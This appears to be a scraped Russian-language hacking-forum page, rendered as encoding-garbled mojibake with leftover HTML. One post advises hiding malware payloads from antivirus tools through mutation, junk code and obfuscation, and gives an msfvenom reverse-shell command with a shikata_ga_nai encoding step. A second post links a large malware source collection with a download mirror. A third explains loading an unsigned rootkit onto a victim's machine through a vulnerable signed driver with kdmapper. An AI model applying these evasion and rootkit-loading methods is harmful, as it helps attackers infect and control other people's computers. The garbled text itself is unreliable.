–¢–∞–∫–∂–µ –Ω–µ–ø–ª–æ—Ö–æ, –ø—Ä–∏ –ø—Ä–æ–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ –≤–∞—à–µ–≥–æ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –∑–≤–µ—Ä—å–∫–∞ –∏–ª–∏ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —É—á–∏—Ç—ã–≤–∞—Ç—å –º–µ—Ç–æ–¥—ã –∞–Ω—Ç–∏–æ—Ç–ª–∞–¥–∫–∏ –∏ –º–æ—Ä—Ñ–∏–Ω–≥–∞ —Å–∞–º–æ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
<br />
–≠—Ç–æ –º–æ–∂–Ω–æ –¥–µ–ª–∞—Ç—å –ø—Ä—è–º –≤ –ø–∞–º—è—Ç–∏, –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º, –≤–æ—Ç –Ω–∞–ø—Ä–∏–º–µ—Ä —è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª —Ç–∞–∫–æ–π –º–µ—Ö–∞–Ω–∏–∑–º –≤ –∫—Ä–∏–ø—Ç–æ—Ä–µ:<a href="https://github.com/XShar/Run_pe_cryptor_frame/tree/master/modules/simple_mutate_pe" target="_blank" class="link link--external" rel="noopener">Run_pe_cryptor_frame/modules/simple_mutate_pe at master ¬∑ XShar/Run_pe_cryptor_frame</a><br />
<br />
–ù–∞ –≤—Ö–æ–¥ –ø–æ–¥–∞—ë—Ç—Å—è –±–∏–Ω–∞—Ä–Ω—ã–π –∫–æ–¥, –Ω–∞ –≤—ã—Ö–æ–¥–µ –ø–æ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –º—É—Ç–∏—Ä—É—é—Ç—Å—è, —Ç.–µ. –º–µ–Ω—è—é—Ç—Å—è –æ–ø–∫–æ–¥—ã –Ω–∞ –∞–Ω–∞–ª–æ–≥–∏.<br />
–£–∂–µ –∫–∞–∫–∏–µ-—Ç–æ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—ã –º–æ–≥—É—Ç –Ω–µ –¥–µ—Ç–µ–∫—Ç–∏—Ç—å, –≤—Å—ë –∑–∞–≤–∏—Å–∏—Ç –æ—Ç –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ —ç–≤—Ä–∏—Å—Ç–∏–∫–∏ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞.<br />
<br />
–¢–∞–∫–∂–µ –µ—Å–ª–∏ —É –≤–∞—Å –µ—Å—Ç—å –∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥ –Ω–∞–≥—Ä—É–∑–∫–∏, –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ä–∞–∑–ª–∏—á–Ω—ã–µ –ø—Ä–∏—ë–º—ã –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –º—É—Å–æ—Ä–Ω–æ–≥–æ –∫–æ–¥–∞, –Ω–∞–ø—Ä–∏–º–µ—Ä –≤–æ—Ç:<a href="https://github.com/XShar/super_gen_trash_c" target="_blank" class="link link--external" rel="noopener">GitHub - XShar/super_gen_trash_c: –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–æ–¥–∞ –Ω–∞ —Å–∏</a><br />
–¢–µ—Ö–Ω–∏–∫–∏ –∑–∞–¥–µ—Ä–∂–µ–∫ –∏ –ø—Ä–æ—á–µ–µ –∫–∞–∫ –≤ —Ç–µ–º–∞—Ö –ß–µ—Ä–ø–∞–µ–º —Å–∏–ª—ã –≤ –∞–Ω—Ç–∏–æ—Ç–ª–∞–¥–∫–µ | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot; –∏ –£–º–µ–Ω—å—à–µ–Ω–∏–µ –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç–∏ –¥–µ—Ç–µ–∫—Ç–∞ –∑–≤–µ—Ä—å–∫–∞ | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;<br />
<br />
–ï—Å–ª–∏ –≤—ã-–∂–µ –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç–µ –Ω–∞–≥—Ä—É–∑–∫—É —Ñ—Ä–µ–π–º–≤–æ—Ä–∫–∞–º–∏, —Ç–æ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –≤–∫–ª—é—á–∞–π—Ç–µ –æ–ø—Ü–∏–∏ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏  –∏ –∑–∞—â–∏—Ç—ã, –≤–æ—Ç –ø—Ä–∏–º–µ—Ä—ã:<br />
<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-1-metasploit"></a>1. Metasploit&#8203;<a class="hoverLink" href="#-1-metasploit" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3>Metasploit —Ç–∞–∫–∂–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç —Ä–∞–∑–ª–∏—á–Ω—ã–µ –∫–æ–¥–∏—Ä–æ–≤—â–∏–∫–∏ –¥–ª—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ payload. –ù–∞–ø—Ä–∏–º–µ—Ä:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>msfvenom -p windows/shell_reverse_tcp LHOST=–í–ê–®_IP LPORT=4444 -f c -e x86/shikata_ga_nai -i 3</code></pre>
	</div>
</div><br />
–ó–¥–µ—Å—å -e x86/shikata_ga_nai —É–∫–∞–∑—ã–≤–∞–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–æ–¥–∏—Ä–æ–≤—â–∏–∫ shikata_ga_nai, –∞ -i 3 —É–∫–∞–∑—ã–≤–∞–µ—Ç –ø—Ä–∏–º–µ–Ω–∏—Ç—å –∫–æ–¥–∏—Ä–æ–≤—â–∏–∫ 3 —Ä–∞–∑–∞.<br />
<br />
<b>shikata_ga_nai</b> ‚Äî —ç—Ç–æ –æ–¥–∏–Ω –∏–∑ –Ω–∞–∏–±–æ–ª–µ–µ –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö –∫–æ–¥–∏—Ä–æ–≤—â–∏–∫–æ–≤ –≤ Metasploit. –ï–≥–æ –Ω–∞–∑–≤–∞–Ω–∏–µ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –æ—Ç —è–ø–æ–Ω—Å–∫–æ–≥–æ –≤—ã—Ä–∞–∂–µ–Ω–∏—è &quot;‰ªïÊñπ„Åå„Å™„ÅÑ&quot;, —á—Ç–æ –º–æ–∂–Ω–æ –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –∫–∞–∫ &quot;–Ω–∏—á–µ–≥–æ –Ω–µ –ø–æ–¥–µ–ª–∞–µ—à—å&quot; –∏–ª–∏ &quot;—ç—Ç–æ –Ω–µ–∏–∑–±–µ–∂–Ω–æ&quot;.<br />
<br />
–í –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ Metasploit, shikata_ga_nai –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ —à–µ–ª–ª–∫–æ–¥–∞ —Å —Ü–µ–ª—å—é –∏–∑–±–µ–∂–∞—Ç—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞–º–∏ –∏–ª–∏ IDS/IPS —Å–∏—Å—Ç–µ–º–∞–º–∏. –≠—Ç–æ—Ç –∫–æ–¥–∏—Ä–æ–≤—â–∏–∫ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –ø–æ–ª–∏–º–æ—Ä—Ñ–Ω—É—é —Ç–µ—Ö–Ω–∏–∫—É, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –∫–∞–∂–¥—ã–π —Ä–∞–∑, –∫–æ–≥–¥–∞ –æ–Ω –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è, –æ–Ω –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω—ã–π –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —à–µ–ª–ª–∫–æ–¥, –¥–∞–∂–µ –µ—Å–ª–∏ –∏—Å—Ö–æ–¥–Ω—ã–π —à–µ–ª–ª–∫–æ–¥ –æ—Å—Ç–∞–µ—Ç—Å—è –Ω–µ–∏–∑–º–µ–Ω–Ω—ã–º.<br />
–í–æ—Ç –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –æ—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏ shikata_ga_nai:<br />
<ol>
<li data-xf-list-type="ol"><b>–ü–æ–ª–∏–º–æ—Ä—Ñ–∏–∑–º</b>: –ö–∞–∂–¥–æ–µ –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–∏–µ —É–Ω–∏–∫–∞–ª—å–Ω–æ.</li>
<li data-xf-list-type="ol"><b>–†–∞–∑–º–µ—Ä</b>: –ö–æ–¥–∏—Ä–æ–≤—â–∏–∫ –º–æ–∂–µ—Ç –≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å —à–µ–ª–ª–∫–æ–¥—ã —Ä–∞–∑–Ω–æ–≥–æ —Ä–∞–∑–º–µ—Ä–∞, —á—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–æ–ª–µ–∑–Ω–æ –¥–ª—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π.</li>
<li data-xf-list-type="ol"><b>–î–∏–Ω–∞–º–∏—á–µ—Å–∫–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –∫–ª—é—á–∞</b>: shikata_ga_nai –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ –∏–∑–º–µ–Ω—è—é—â–∏–π—Å—è –∫–ª—é—á –¥–ª—è –∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö, —á—Ç–æ –¥–µ–ª–∞–µ—Ç –µ–≥–æ —Å–ª–æ–∂–Ω–µ–µ –¥–ª—è —Å—Ç–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –∞–Ω–∞–ª–∏–∑–∞.</li>
<li data-xf-list-type="ol"><b>–†–µ–≥–∏—Å—Ç—Ä–æ–≤–∞—è –Ω–µ–∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—å</b>: –ö–æ–¥–∏—Ä–æ–≤—â–∏–∫ —Å–ø—Ä–æ–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω —Ç–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, —á—Ç–æ–±—ã –Ω–µ –∑–∞–≤–∏—Å–µ—Ç—å –æ—Ç –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã—Ö —Ä–µ–≥–∏—Å—Ç—Ä–æ–≤, —á—Ç–æ —É–≤–µ–ª–∏—á–∏–≤–∞–µ—Ç –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å —É—Å–ø–µ—à–Ω–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —à–µ–ª–ª–∫–æ–¥–∞ –≤ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —É—Å–ª–æ–≤–∏—è—Ö.</li>
</ol>–ù–µ—Å–º–æ—Ç—Ä—è –Ω–∞ –µ–≥–æ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—Å—Ç—å, —Å–æ –≤—Ä–µ–º–µ–Ω–µ–º –º–Ω–æ–≥–∏–µ —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Å–∏—Å—Ç–µ–º—ã –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è —É–≥—Ä–æ–∑ —Å—Ç–∞–ª–∏ —É–∑–Ω–∞–≤–∞—Ç—å –ø–∞—Ç—Ç–µ—Ä–Ω—ã, —Å–≤—è–∑–∞–Ω–Ω—ã–µ —Å —ç—Ç–∏–º –∫–æ–¥–∏—Ä–æ–≤—â–∏–∫–æ–º. –¢–µ–º –Ω–µ –º–µ–Ω–µ–µ, –≤ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö —Å—Ü–µ–Ω–∞—Ä–∏—è—Ö –∏ —Å –ø—Ä–∞–≤–∏–ª—å–Ω–æ–π –∫–æ–º–±–∏–Ω–∞—Ü–∏–µ–π –¥—Ä—É–≥–∏—Ö —Ç–µ—Ö–Ω–∏–∫ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏, –æ–Ω –≤—Å–µ –µ—â–µ –º–æ–∂–µ—Ç –±—ã—Ç—å —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–º.<br />
<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-2-veil"></a>2. Veil&#8203;<a class="hoverLink" href="#-2-veil" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3><a href="https://github.com/Veil-Framework/Veil" target="_blank" class="link link--external" rel="noopener"><b>Veil</b></a> ‚Äî —ç—Ç–æ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö payloads, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è.<br />
<br />
<h4 class="bbHeading"><a class="u-anchorTarget" name="-sozdaniye-i-morfing-payload"></a>–°–æ–∑–¥–∞–Ω–∏–µ –∏ –º–æ—Ä—Ñ–∏–Ω–≥ payload:&#8203;<a class="hoverLink" href="#-sozdaniye-i-morfing-payload" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h4>–ü–æ—Å–ª–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ Veil, –∑–∞–ø—É—Å—Ç–∏—Ç–µ –µ–≥–æ:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>Veil.py</code></pre>
	</div>
</div><br />
<b>–ò—Ç–æ–≥:</b><br />
<br />
–î–ª—è –æ–±—Ö–æ–¥–∞ –¥–µ—Ç–µ–∫—Ç–∞ –≤ –ø–∞–º—è—Ç–∏ –∏ –¥–µ—Ç–µ–∫—Ç–∞ –ø–æ –ø–æ–≤–µ–¥–µ–Ω–∏—é, —Å–∞–º–∞ –Ω–∞–≥—Ä—É–∑–∫–∞ –∏ –∏—Ç–æ–≥–æ–≤—ã–π –∑–≤–µ—Ä–µ–∫ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å—Ç—ã–º.<br />
–í—Å–µ –æ—Å—Ç–∞–ª—å–Ω—ã–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –ø–æ–º–æ–≥–∞—é—Ç —Å–¥–µ–ª–∞—Ç—å –∑–∞–ø—É—Å–∫ –∑–≤–µ—Ä—å–∫–∞ —Å–∫—Ä—ã—Ç—ã–º, –Ω–æ –Ω–µ –ø–æ–∑–≤–æ–ª—è—é—Ç –∏–∑–±–µ–∂–∞—Ç—å –ø–æ–≤–µ–¥–µ–Ω–∏–µ —Å–≤—è–∑–∞–Ω–Ω–æ–µ —Å –∑–∞–ø—É—â–µ–Ω–Ω—ã–º –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º –∫–æ–¥–æ–º.)</div>
						

							<h2>–û–≥—Ä–æ–º–Ω–∞—è –±–∞–∑–∞ –∏—Å—Ö–æ–¥–Ω–∏–∫–æ–≤ —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –≤–∏—Ä—É—Å–æ–≤ –¥–ª—è —Ä–∞–∑–Ω—ã—Ö –ø–ª–∞—Ç—Ñ–æ—Ä–º</h2>

							

							

							<div class="bbWrapper">–í–µ—Å—å –∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥, –∫–æ—Ç–æ—Ä—ã–π —É–ø–∞–∫–æ–≤–∞–Ω, –º–æ–∂–µ—Ç –±—ã—Ç—å –∏–ª–∏ –Ω–µ –±—ã—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω —Å –ø–∞—Ä–æ–ª–µ–º &#039;infected&#039; (–±–µ–∑ –∫–∞–≤—ã—á–µ–∫). –û—Ç–¥–µ–ª—å–Ω—ã–µ —Ñ–∞–π–ª—ã, –≤–µ—Ä–æ—è—Ç–Ω–æ, –Ω–µ —É–ø–∞–∫–æ–≤–∞–Ω—ã.<br />
<br />
–°—Ç—Ä—É–∫—Ç—É—Ä–∞ –∫–∞—Ç–∞–ª–æ–≥–æ–≤:<br />
<ul>
<li data-xf-list-type="ul">Android<ul>
<li data-xf-list-type="ul">Generic Android OS malware, some leaks and proof-of-concepts</li>
</ul></li>
<li data-xf-list-type="ul">Engines<ul>
<li data-xf-list-type="ul">BAT</li>
<li data-xf-list-type="ul">Linux</li>
<li data-xf-list-type="ul">VBS</li>
<li data-xf-list-type="ul">Win32</li>
</ul></li>
<li data-xf-list-type="ul">Java<ul>
<li data-xf-list-type="ul">Some java infectors, proof-of-concept ransomware</li>
</ul></li>
<li data-xf-list-type="ul">Javascript<ul>
<li data-xf-list-type="ul">In-browser malware</li>
</ul></li>
<li data-xf-list-type="ul">Legacy Windows<ul>
<li data-xf-list-type="ul">Win2k</li>
<li data-xf-list-type="ul">Win32</li>
<li data-xf-list-type="ul">Win95</li>
<li data-xf-list-type="ul">Win98</li>
<li data-xf-list-type="ul">Win9x</li>
<li data-xf-list-type="ul">WinCE</li>
</ul></li>
<li data-xf-list-type="ul">Libs (libraries)<ul>
<li data-xf-list-type="ul">Bootkits</li>
<li data-xf-list-type="ul">DDoS proof-of-concepts</li>
<li data-xf-list-type="ul">Win32 libraries (disassemblers, etc).</li>
</ul></li>
<li data-xf-list-type="ul">Linux<ul>
<li data-xf-list-type="ul">Backdoors</li>
<li data-xf-list-type="ul">Botnets</li>
<li data-xf-list-type="ul">Infectors</li>
<li data-xf-list-type="ul">Mirai-Family (related and/or spin-offs)</li>
<li data-xf-list-type="ul">Rootkits</li>
<li data-xf-list-type="ul">Tools</li>
<li data-xf-list-type="ul">Trojans</li>
</ul></li>
<li data-xf-list-type="ul">MSDOS</li>
<li data-xf-list-type="ul">MSIL</li>
<li data-xf-list-type="ul">MacOS</li>
<li data-xf-list-type="ul">Other<ul>
<li data-xf-list-type="ul">Acad malware</li>
<li data-xf-list-type="ul">FreeBSD malware</li>
<li data-xf-list-type="ul">SunOS malware</li>
<li data-xf-list-type="ul">Symbian OS malware</li>
<li data-xf-list-type="ul">Discord-specific malware</li>
</ul></li>
<li data-xf-list-type="ul">PHP<ul>
<li data-xf-list-type="ul">Albania family</li>
<li data-xf-list-type="ul">C99 family</li>
<li data-xf-list-type="ul">Crewcorp family</li>
<li data-xf-list-type="ul">Defacement Tools</li>
<li data-xf-list-type="ul">PHP Infectors</li>
<li data-xf-list-type="ul">Lanker family</li>
<li data-xf-list-type="ul">Macker family</li>
<li data-xf-list-type="ul">PhpSpy family</li>
<li data-xf-list-type="ul">R57-shell family</li>
</ul></li>
<li data-xf-list-type="ul">Panel (web panel collections)</li>
<li data-xf-list-type="ul">Perl<ul>
<li data-xf-list-type="ul">Various backdoors, hack tools, and infectors</li>
</ul></li>
<li data-xf-list-type="ul">Phishing<ul>
<li data-xf-list-type="ul">Collection of various phishing pages</li>
</ul></li>
<li data-xf-list-type="ul">Point of Sales malware</li>
<li data-xf-list-type="ul">Python<ul>
<li data-xf-list-type="ul">Hacktools, various exotic-malware (such as chastity belt ransomware)</li>
</ul></li>
<li data-xf-list-type="ul">Ruby</li>
<li data-xf-list-type="ul">Win32<ul>
<li data-xf-list-type="ul">Binders</li>
<li data-xf-list-type="ul">Botnets</li>
<li data-xf-list-type="ul">Crypters</li>
<li data-xf-list-type="ul">Exploit kits</li>
<li data-xf-list-type="ul">Infectors</li>
<li data-xf-list-type="ul">Internet worms</li>
<li data-xf-list-type="ul">Malware families</li>
<li data-xf-list-type="ul">Ransomware</li>
<li data-xf-list-type="ul">Rootkits</li>
<li data-xf-list-type="ul">Stealers</li>
</ul></li>
</ul>–°—Å—ã–ª–∫–∞ –Ω–∞ —Å–±–æ—Ä–Ω–∏–∫:<a href="https://github.com/vxunderground/MalwareSourceCode/tree/main" target="_blank" class="link link--external" rel="noopener">GitHub - vxunderground/MalwareSourceCode: Collection of malware source code for a variety of platforms in an array of different programming languages.</a><br />
<br />
–ó–µ—Ä–∫–∞–ª–æ —Å –ú–µ–≥–∞:<br />
<br />
<div><a href="https://mega.nz/file/zsJWHRjA#JkXTsWQ0NX60NJ2jISkAuuCXOtMvd_GcSOwO0XNiFgQ" target="_blank" class="link link--external" rel="noopener">https://mega.nz/file/zsJWHRjA#JkXTsWQ0NX60NJ2jISkAuuCXOtMvd_GcSOwO0XNiFgQ</a></div></div>
						

							<h2>–ö–∞–∫ RootKit –∑–∞–≥—Ä—É–∑–∏—Ç—å –∏–ª–∏ –∂–µ –∫–∞–∫ –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥—Ä–∞–π–≤–µ—Ä –±–µ–∑ –ø–æ–¥–ø–∏—Å–∏</h2>

							

							

							<div class="bbWrapper">–î–ª—è –Ω–∞—á–∞–ª–∞ –¥–∞–≤–∞–π—Ç–µ —Ä–∞–∑–±–µ—Ä–µ–º—Å—è —á—Ç–æ —Ç–∞–∫–æ–µ RootKit?<br />
<br />
RootKit - —ç—Ç–æ —Ç–∏–ø –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç —Ö–∞–∫–µ—Ä–∞–º –¥–æ—Å—Ç—É–ø –∫ —Ü–µ–ª–µ–≤—ã–º –∫–æ–º–ø—å—é—Ç–µ—Ä–∞–º. RootKit –º–æ–∂–µ—Ç —Å–∫—Ä—ã–≤–∞—Ç—å —Å–≤–æ–µ –ø—Ä–∏—Å—É—Ç—Å—Ç–≤–∏–µ, –Ω–æ –æ—Å—Ç–∞–≤–∞—Ç—å—Å—è –∞–∫—Ç–∏–≤–Ω—ã–º. –ö–∞–∫ —Ç–æ–ª—å–∫–æ –æ–Ω–∏ –ø–æ–ª—É—á–∞—é—Ç –Ω–µ—Å–∞–Ω–∫—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞–º, RootKit –ø–æ–∑–≤–æ–ª—è—é—Ç –∫–∏–±–µ—Ä–ø—Ä–µ—Å—Ç—É–ø–Ω–∏–∫–∞–º –∫—Ä–∞—Å—Ç—å –ª–∏—á–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∏ —Ñ–∏–Ω–∞–Ω—Å–æ–≤—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é, —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–µ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–µ –∏–ª–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä—ã –∫–∞–∫ —á–∞—Å—Ç—å –±–æ—Ç–Ω–µ—Ç–∞ –¥–ª—è —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω–∏—è —Å–ø–∞–º–∞ –∏ —É—á–∞—Å—Ç–∏—è –≤ DDoS-–∞—Ç–∞–∫–∞—Ö.<br />
<br />
–ù–∞–∑–≤–∞–Ω–∏–µ ‚ÄúRootKit‚Äù –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –æ—Ç –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º Unix –∏ Linux, –≥–¥–µ –Ω–∞–∏–±–æ–ª–µ–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è ‚Äúroot‚Äù. –ü—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä—ã–µ –ø–æ–∑–≤–æ–ª—è—é—Ç –Ω–µ—Å–∞–Ω–∫—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –¥–æ—Å—Ç—É–ø root –∏–ª–∏ admin –∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É, –∏–∑–≤–µ—Å—Ç–Ω—ã –∫–∞–∫ &quot;kit&quot;.<br />
<br />
–î–ª—è —Ç–æ–≥–æ —á—Ç–æ –±—ã RootKit —Å–º–æ–≥ –∑–∞–ø—É—Å—Ç–∏—Ç—å—Å—è –Ω–∞ –ø–∫ –∂–µ—Ä—Ç–≤—ã, –µ—Å—Ç—å 2 –≤–∞—Ä–∏–∞–Ω—Ç–∞:<br />
<ol>
<li data-xf-list-type="ol">–ó–∞–ø–ª–∞—Ç–∏—Ç—å –æ—Ç 150$ –∑–∞ –ø–æ–¥–ø–∏—Å—å –¥—Ä–∞–π–≤–µ—Ä–∞</li>
<li data-xf-list-type="ol">–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –º–∞–ø–ø–µ—Ä –∫–æ—Ç–æ—Ä—ã–π —Å –ø–æ–º–æ—â—å—é —É—è–∑–≤–∏–º–æ–≥–æ –¥—Ä–∞–π–≤–µ—Ä–∞ (–Ω–∞ –∫–æ—Ç–æ—Ä–æ–º —É–∂–µ –µ—Å—Ç—å –ø–æ–¥–ø–∏—Å—å) –∑–∞–≥—Ä—É–∑–∏—Ç –≤–∞—à RootKit.</li>
</ol>–ü–µ—Ä–≤—ã–π –≤–∞—Ä–∏–∞–Ω—Ç –Ω–∞–º –Ω–µ –ø–æ–¥—Ö–æ–¥–∏—Ç, —Ç–∞–∫-–∫–∞–∫ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç –º–æ–≥—É—Ç –∑–∞–±–∞–Ω–∏—Ç—å, –¥–∞ –∏ –≤–æ–æ–±—â–µ, –∑–∞—á–µ–º –ø–ª–∞—Ç–∏—Ç—å –µ—Å–ª–∏ –º—ã –º–æ–∂–µ–º —ç—Ç–æ —Å–¥–µ–ª–∞—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω–æ?)<br />
<br />
–î–ª—è –≤—Ç–æ—Ä–æ–≥–æ –≤–∞—Ä–∏–∞–Ω—Ç–∞ –Ω–∞–º –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è kdmapper, –¥–ª—è –ø—Ä–∏–º–µ—Ä–∞ –º–æ–∂–µ–º –≤–∑—è—Ç—å —ç—Ç–æ—Ç <a href="https://github.com/TheCruZ/kdmapper" target="_blank" class="link link--external" rel="noopener">GitHub - TheCruZ/kdmapper: KDMapper is a simple tool that exploits iqvw64e.sys Intel driver to manually map non-signed drivers in memory</a><br />
<br />
